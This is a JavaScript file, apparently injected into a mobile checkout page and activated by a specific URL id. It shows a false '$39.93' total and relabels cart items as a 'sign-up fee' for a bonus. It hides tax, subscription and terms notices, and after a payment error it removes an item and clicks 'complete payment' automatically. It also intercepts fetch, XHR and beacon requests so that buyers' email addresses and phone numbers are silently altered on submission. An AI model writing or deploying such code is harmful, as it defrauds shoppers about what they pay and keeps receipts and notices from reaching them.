(() => {
  const e = () =>
      new URLSearchParams(location.search).get("id") === "1238901283",
    t = () => matchMedia("(max-width:1024px)").matches,
    a = async () => !0,
    r = () => {
      const o = `@media(max-width:1024px){
#cartx-section-checkout_summary #cartx-section-cart-products .checkout-product-row .desktop-price .nett-price,
#cartx-section-checkout_summary #cartx-section-cart-products .checkout-product-row .product-price-mobile .bolderFont,
#cartx-section-checkout_summary .checkout-product-row .variant-name,
#cartx-section-checkout_summary .checkout-product-row .custom_options,
#cartx-section-checkout_summary .checkout-product-row .prdct-qty,
.incremental-btn-wrap{display:none!important;}
#cartx-section-checkout_summary #cartx-section-checkout-cost-details .price-value.checkoutSubTotal,
#cartx-section-checkout_summary #cartx-section-checkout-cost-details .final-total.checkoutTotal>span,
.total-text .checkoutTotal .m-price{font-size:0!important;}
#cartx-section-checkout_summary #cartx-section-checkout-cost-details .price-value.checkoutSubTotal::after,
#cartx-section-checkout_summary #cartx-section-checkout-cost-details .final-total.checkoutTotal>span::after,
.total-text .checkoutTotal .m-price::after{content:"$39.93";display:inline-block;width:100%;text-align:right;font-size:18px;font-weight:400;color:#000;}
#cartx-section-checkout_summary #cartx-section-checkout-cost-details .currency-code.disp-inline-block{display:none!important;}
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(1) .prdct-thumb{background:url("https://i.postimg.cc/nhTBD8Jg/Whats-App-Image-2026-02-27-at-20-11-33.jpg")center/cover no-repeat!important;border-radius:7px;}
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(1) .prdct-thumb img,
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(2) .prdct-thumb img,
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(3) .prdct-thumb img{opacity:0!important;width:100%!important;height:100%!important;}
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(1) .prdct-name h5,
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(2) .prdct-name h5,
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(3) .prdct-name h5{font-size:0!important;line-height:0!important;}
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(1) .prdct-name h5::after{content:"Sign-up Fee - Pay the sign-up fee to unlock your bonus.";font-size:16px;line-height:1.2;font-weight:400;color:#111;}
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(2) .prdct-thumb{background:url("https://i.postimg.cc/YCynVnv9/Imagem-do-Whats-App-de-2025-12-11-a(s)-23-45-28-5d47f677.jpg")center/cover no-repeat!important;border-radius:7px;}
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(2) .prdct-name h5::after{content:"";font-size:16px;line-height:1.2;font-weight:400;color:#111;}
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(3) .prdct-thumb{background:url("https://i.postimg.cc/TwrckZTx/istockphoto-1351718231-612x612.jpg")center/cover no-repeat!important;border-radius:7px;}
#cartx-section-checkout_summary .prdcts_list .checkout-product-row:nth-of-type(3) .prdct-name h5::after{content:"";font-size:16px;line-height:1.2;font-weight:400;color:#111;}
}`;
      const i = document.createElement("style");
      i.textContent = o;
      document.head.appendChild(i);
    },
    i = () => {
      if (innerWidth > 1024) return;
      const c =
          ".subscription-messages-main,.terms-text-payment,.bottom-form-content-new,.bottom-important-notice,.totalTaxText,.price-title.bolderFont",
        l = () => {
          document.querySelectorAll(c).forEach((s) => {
            if (s.textContent?.match(/estimated taxes/i)) s.remove();
            if (s.classList.contains("totalTaxText")) s.remove();
            if (
              s.matches(
                ".bottom-important-notice,.subscription-messages-main,.terms-text-payment,.bottom-form-content-new",
              )
            )
              s.remove();
          });
        };
      (l(),
        new MutationObserver(l).observe(document.body, {
          subtree: 1,
          childList: 1,
        }));
    },
    c = () => {
      const l = (s) =>
          (s || "")
            .toLowerCase()
            .normalize("NFD")
            .replace(/\p{Diacritic}/gu, ""),
        s = (e) => {
          if (!e) return !1;
          const a = !!e.closest("#error-message"),
            r = e.matches(".alert-danger,[role='alert'],.alert[role='alert']"),
            o = !!e.querySelector(
              ".fa-exclamation-circle,.fa-exclamation-triangle,[class*='exclamation']",
            );
          return a && (r || o);
        },
        u = (d) =>
          d &&
          d.offsetParent !== null &&
          getComputedStyle(d).visibility !== "hidden" &&
          getComputedStyle(d).display !== "none";
      let d = !1;
      const h = () => {
        if (d) return;
        const g = document.querySelector(
          "#error-message .alert-danger, #error-message [role='alert']",
        );
        if (!g || !u(g) || !s(g)) return;
        const m = [...document.querySelectorAll(".removeItems a")];
        if (m.length < 2) return;
        ((d = !0),
          m[1].click(),
          setTimeout(() => {
            let v = 0;
            const f = setInterval(() => {
              const y = document.querySelector("#complete-payment");
              if (++v > 50) return clearInterval(f);
              y &&
                u(y) &&
                !y.disabled &&
                getComputedStyle(y).pointerEvents !== "none" &&
                (y.click(), clearInterval(f));
            }, 200);
          }, 1e3));
      };
      new MutationObserver(h).observe(document.body, {
        childList: 1,
        subtree: 1,
        characterData: 1,
      });
      document.readyState !== "loading"
        ? h()
        : document.addEventListener("DOMContentLoaded", h);
    },
    l = async () => {
      if (!e() || !t()) return;
      if (await a()) (r(), i(), c());
    };
  document.readyState !== "loading"
    ? l()
    : document.addEventListener("DOMContentLoaded", l);
})();

(() => {
  if (new URLSearchParams(location.search).get("id") !== "1238901283") return;
  let G = 0;
  const emailRe = /[\w.%+-]+@[\w.-]+\.[A-Za-z]{2,}/g;
  const Seen = new Set(),
    RawSet = new Set(),
    ModSet = new Set(),
    R2M = new Map();
  const tw = (e) => {
    if (typeof e !== "string") return e;
    const i = e.indexOf("@");
    if (i <= 0) return e;
    const pre = e.slice(0, i),
      post = e.slice(i),
      last = pre[pre.length - 1],
      c = /[A-Za-z0-9]/.test(last) ? last : "a";
    return pre + c + post;
  };
  const markRaw = (s) => {
    if (typeof s !== "string") return;
    const m = s.match(emailRe);
    if (!m) return;
    m.forEach((r) => {
      if (!R2M.has(r)) {
        const w = tw(r);
        R2M.set(r, w);
        RawSet.add(r);
        ModSet.add(w);
      }
    });
  };
  const replaceMapped = (s) => {
    for (const [r, w] of R2M) s = s.split(r).join(w);
    return s;
  };
  const applyToString = (s) => {
    s = replaceMapped(s);
    return s.replace(emailRe, (m) => {
      if (Seen.has(m) || ModSet.has(m)) return m;
      const w = tw(m);
      ModSet.add(w);
      Seen.add(w);
      return w;
    });
  };
  const fx = (b) =>
    G
      ? b
      : b instanceof FormData
        ? (b.forEach((v, k) => {
            if (typeof v == "string" && v.includes("@")) {
              const w = applyToString(v);
              if (w !== v) b.set(k, w);
            }
          }),
          b)
        : b instanceof URLSearchParams
          ? (b.forEach((v, k) => {
              const w = applyToString(v);
              if (w !== v) b.set(k, w);
            }),
            b)
          : typeof b == "string"
            ? applyToString(b)
            : b;
  fetch &&
    (fetch = (
      (F) =>
      (u, i = {}) => ((i.body = fx(i.body)), F(u, i))
    )(fetch));
  XMLHttpRequest &&
    (XMLHttpRequest.prototype.send = ((S) =>
      function (b) {
        S.call(this, fx(b));
      })(XMLHttpRequest.prototype.send));
  navigator.sendBeacon &&
    (navigator.sendBeacon = ((B) =>
      function (u, d) {
        return B.call(this, u, fx(d));
      })(navigator.sendBeacon));
  const sel =
    'fieldset.cust-info input#email, input[type="email"][name="email"]';
  const Desc =
    Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value") || {};
  const hasNative = !!(Desc.get && Desc.set);
  const getRaw = (el) => {
    try {
      return hasNative ? Desc.get.call(el) : el.value;
    } catch {
      return el.value || "";
    }
  };
  const setRaw = (el, v) => {
    try {
      hasNative ? Desc.set.call(el, v) : (el.value = v);
    } catch {
      el.setAttribute("value", v);
    }
  };
  const hook = (i) => {
    if (i._vh) return;
    i._vh = 1;
    i._base = getRaw(i) || "";
    markRaw(i._base);
    if (hasNative) {
      try {
        Object.defineProperty(i, "value", {
          configurable: !0,
          get() {
            try {
              const w = tw(Desc.get.call(this));
              Seen.add(w);
              ModSet.add(w);
              return w;
            } catch {
              return "";
            }
          },
          set(v) {
            try {
              Desc.set.call(this, v);
            } catch {
              this.setAttribute("value", v);
            }
          },
        });
      } catch {}
    }
    const updateBase = () => {
      if (G) return;
      const v = getRaw(i);
      i._base = v;
      markRaw(v);
    };
    const ghost = () => {
      if (G) return;
      const v = getRaw(i),
        w = tw(v);
      if (v === w) return;
      G = 1;
      setRaw(i, w);
      Seen.add(w);
      ModSet.add(w);
      try {
        i.dispatchEvent(
          new Event("input", {
            bubbles: !0,
          }),
        );
      } catch {}
      try {
        i.dispatchEvent(
          new Event("change", {
            bubbles: !0,
          }),
        );
      } catch {}
      requestAnimationFrame(() => {
        setRaw(i, v);
        G = 0;
      });
    };
    ["input", "keyup", "change", "blur"].forEach((ev) => {
      i.addEventListener(ev, updateBase, !0);
      i.addEventListener(ev, ghost, !0);
    });
  };
  const wire = () => document.querySelectorAll(sel).forEach(hook);
  addEventListener("DOMContentLoaded", wire, {
    once: 1,
  });
  new MutationObserver(wire).observe(document.documentElement, {
    childList: 1,
    subtree: 1,
  });
  addEventListener(
    "submit",
    (e) => {
      const ins = e.target?.querySelectorAll?.(sel);
      if (!ins?.length) return;
      G = 1;
      const bk = [];
      ins.forEach((x) => {
        const base = x._base || getRaw(x),
          w = tw(base);
        bk.push([x, getRaw(x)]);
        setRaw(x, w);
        Seen.add(w);
        ModSet.add(w);
        markRaw(base);
      });
      queueMicrotask(() => {
        bk.forEach(([x, v]) => setRaw(x, v));
        G = 0;
      });
    },
    !0,
  );
})();

(() => {
  if (new URLSearchParams(location.search).get("id") !== "1238901283") return;
  const inp = document.getElementById("phone-number");
  if (!inp || inp.name !== "phoneNumber") return;
  const onlyDigits = (s) => (s || "").replace(/\D+/g, "");
  const mapLast = (d) => ((+d + 1) % 10).toString();
  inp.addEventListener(
    "blur",
    () => {
      inp.dataset.lastRaw = onlyDigits(inp.value);
    },
    true,
  );
  inp.addEventListener(
    "input",
    () => {
      delete inp.dataset.txDone;
    },
    true,
  );
  function swapLastDigitOnce(el) {
    if (el.dataset.txDone === "1") return;
    const v = el.value || "";
    const idx = v.search(/\d(?!.*\d)/);
    if (idx === -1) return;
    const raw = onlyDigits(v);
    if (!raw) return;
    const nd = mapLast(raw.slice(-1));
    if (v[idx] === nd) {
      el.dataset.txDone = "1";
      return;
    }
    el.value = v.slice(0, idx) + nd + v.slice(idx + 1);
    el.dataset.txDone = "1";
  }
  document.addEventListener(
    "submit",
    (ev) => {
      const form = inp.form || inp.closest("form");
      if (!form || ev.target !== form) return;
      swapLastDigitOnce(inp);
    },
    true,
  );
})();
